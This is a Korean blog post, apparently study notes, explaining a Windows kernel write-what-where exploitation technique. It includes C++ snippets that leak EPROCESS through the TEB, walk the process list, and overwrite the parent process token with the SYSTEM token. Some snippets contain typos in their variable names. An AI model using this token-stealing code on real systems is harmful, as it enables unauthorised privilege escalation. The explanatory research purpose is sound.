---
layout: post
title: Data-only-attacks are still alive
subtitle: AKA.write-what-where
tags: [Kernel, Window, Exploit, 1day]
---

# Introduction

해당 문서는 Write-What-where 취약점이 발생했을때 어떤식으로 익스를 할지에 대한 문서이다. Windows Kernel 에서 취약점이 발생하여 보통 임의의 영역에 값을 쓸 수 있는 취약점이 발생하는데, 이때 대부분의 경우 kernel address 를 알아야 덮을텐데 이때 KASLR 처럼 주소를 모를때 어떤 방법으로 bypass 를 하는지 해당 방법에 대해 소개하고자 한다. 

[Blackhat 2017 : WriteWhat-Where In Creators UPDATE](https://www.notion.so/b4sh5i/Blackhat-2017-WriteWhat-Where-In-Creators-UPDATE-3e3b7f71122844ee89f9f52d6ef2fe30)

해당 문서에서 다시 요약을 할거 같은데, 이 문서에 요약된 블로그이고 원문은 따로 정리해 볼 예정이다. 

필자는 KASLR 을 우회하는 방법에 Defcon 에서 이야기 했었다고 한다. TEB 의 Win32ThreadInfo 필드를 이용해 ntoskrnl.exe 에 대한 포인터를 릭한다고 하였다. 해당 포인터는 위의 ppt 에서 설명한 대로 임의의 커널 모드 에서 코드를 실행하는데 사용될 수 있다.

[Windows Kernel Shellcode on Windows 10 - Part 4 - There is No Code - Improsec | improving security](https://improsec.com/tech-blog/windows-kernel-shellcode-on-windows-10-part-4-there-is-no-code)

커널 공격을 하는 포스트(위의 링크) 를 확인 할 수 있었다. tagWND Object 를 사용해 현 Thread 인 EPROCESS 를 찾았다. 이 방법은 여전히 유효한다고 하지만 이 방법 이외의 방법을 알아보자.

# Finding EPROCESS

![https://images.squarespace-cdn.com/content/v1/5bbb4a7301232c6e6c8757fa/1544472946998-ZSZR2BJN58IXX6SXXVXS/ke17ZwdGBToddI8pDm48kPSLnaQKHFlqiPxd4FeDqcRZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpxWyarcFPXI_cVMAY2dvw_4HXXmOYONRWWPgXHJ7udpmJv0Ebpy65FF_6SwxrNhrfs/1501283226466_1.png?format=750w](https://images.squarespace-cdn.com/content/v1/5bbb4a7301232c6e6c8757fa/1544472946998-ZSZR2BJN58IXX6SXXVXS/ke17ZwdGBToddI8pDm48kPSLnaQKHFlqiPxd4FeDqcRZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpxWyarcFPXI_cVMAY2dvw_4HXXmOYONRWWPgXHJ7udpmJv0Ebpy65FF_6SwxrNhrfs/1501283226466_1.png?format=750w)

시작하기 앞서, TEB 의 Win32ThreadInfo 포인터를 +0x78 지점에서 찾을 수 있다. 이 포인터는 ThreadInfo 구조에 대한 것으로, 오프셋 0 에서 KTHREAD에 대한 포인터를 포함한다.

![https://images.squarespace-cdn.com/content/v1/5bbb4a7301232c6e6c8757fa/1544472960793-BQOSS0190CWHQQGTQYYC/ke17ZwdGBToddI8pDm48kJyx_kujjhQbRP4v1QsbPLjlfiSMXz2YNBs8ylwAJx2qrCLSIWAQvdC7iWmC9HNtRb3cFzz73fKZ98YzmPqZx9finLHaUVTeFpboRp1yHRt_iqxOD7wrysfuxfjX0c981g/d31f5-img.png?format=300w](https://images.squarespace-cdn.com/content/v1/5bbb4a7301232c6e6c8757fa/1544472960793-BQOSS0190CWHQQGTQYYC/ke17ZwdGBToddI8pDm48kJyx_kujjhQbRP4v1QsbPLjlfiSMXz2YNBs8ylwAJx2qrCLSIWAQvdC7iWmC9HNtRb3cFzz73fKZ98YzmPqZx9finLHaUVTeFpboRp1yHRt_iqxOD7wrysfuxfjX0c981g/d31f5-img.png?format=300w)

![https://images.squarespace-cdn.com/content/v1/5bbb4a7301232c6e6c8757fa/1544473012612-27YHO1O897U2GCI4C46B/ke17ZwdGBToddI8pDm48kCzz3gPu-V2BMjkx9MU2TktZw-zPPgdn4jUwVcJE1ZvWEtT5uBSRWt4vQZAgTJucoTqqXjS3CfNDSuuf31e0tVHe0PJaKRPAXp9voza5_jRXVx1KPDUVS9Xjr0KMCrJWdhur-lC0WofN0YB1wFg-ZW0/e5b05-img.png?format=500w](https://images.squarespace-cdn.com/content/v1/5bbb4a7301232c6e6c8757fa/1544473012612-27YHO1O897U2GCI4C46B/ke17ZwdGBToddI8pDm48kCzz3gPu-V2BMjkx9MU2TktZw-zPPgdn4jUwVcJE1ZvWEtT5uBSRWt4vQZAgTJucoTqqXjS3CfNDSuuf31e0tVHe0PJaKRPAXp9voza5_jRXVx1KPDUVS9Xjr0KMCrJWdhur-lC0WofN0YB1wFg-ZW0/e5b05-img.png?format=500w)

KTHREAD 의 오프셋 +0x220 에는 EPROCESS에 대한 포인터가 포함되어 있다. 또한 EPROCESS 에는 현재 프로세스의 토큰과 상위 프로세스의 프로세스 ID 및 연결된 EPROCSSES 목록에 대한 포인터가 포함되어 있다. 것이 부모 프로세스와 SYSTEM 프로세스의 토큰을 찾는 데 필요한 모든 것 이다.

# Using read/write primitives

이전의 ppt 처럼 크기를 덮어 쓰면 Bitmap 과 tagWND object 를 모두 읽기 및 쓰기 primitives 로 사용할 수 있다. 같은 방법으로 다른 primitives 또한 동일하게 사용이 가능하다. 다른 primitives 를 이용한 방법은 아래와 같다.

```cpp
dword64 teb = (dword64)NtCurrentTeb();
printf("TEB is at: 0x%llx\n", teb);
dword64 threadInfo = *(pdword64)(teb+0x78);
dword64 kthread = readQword(threadInfo);
printf("KTHREAD is at: 0x%llx\n", kthread);
dword64 eprocess = readQword(kthread+0x220);
printf("EPROCESS is at: 0x%llx\n", eprocess);
```

하지만 Creators 를 업데이트 시에 EPROCESS 의 오프셋 에 대한 변경된 내용을 작성해야 한다. 그 때문에 부모 프로세스의 EPROCESS 를 찾아야한다.

```cpp
dword ppid = readQword(eproce3ss + 0x3E0);
printf("Parent Process ID is: %d\n", ppid);
dword searchEprcoess = eprocess;
while(1){
	searchEprocess = readQword(searchEprocess + 0x2E8) - 0x2E8;
	if (readQword(serachEprocess + 0x2E0) == ppid) {
		break;
	}
}
dword parentEprocess = searchEprocess;
printf("Parent EPROCESS is at: 0x%llx\n", parentEprocess);
```

익스를 통해 system 권한으로 cmd.exe 를 할당해야하므로 상위 프로세스를 사용해야한다. 다음이로 system 프로세스의 EPROCESS 가 있다.

```cpp
searchEprocess = eprocess;
while(1){
	searchEprocess = readQword(searchEprocess + 0x2E8) - 0x2E8;
	if (readQword(serachEprocess + 0x2E0) == 4) {
		break;
	}
}
dword systemEprocess = searchEprocess;
printf("system EPROCESS is at: 0x%llx\n", systemEprocess);
```

마지막으로 SYSTEM 토큰의 상위 프로세스의 토큰을 마저 덮는다.

```cpp
dword64 systemToken = readQword(systemEproces + 0x358);
printf("SYSTEM Token is at: 0x%llx\n", systemToken);
writeQword(parentEprocess + 0x358, systemToken);
printf("Process token overwrite! \n");
```

코드를 실행하고 Write-What-Where 조건대로 익스를 하면 된다.
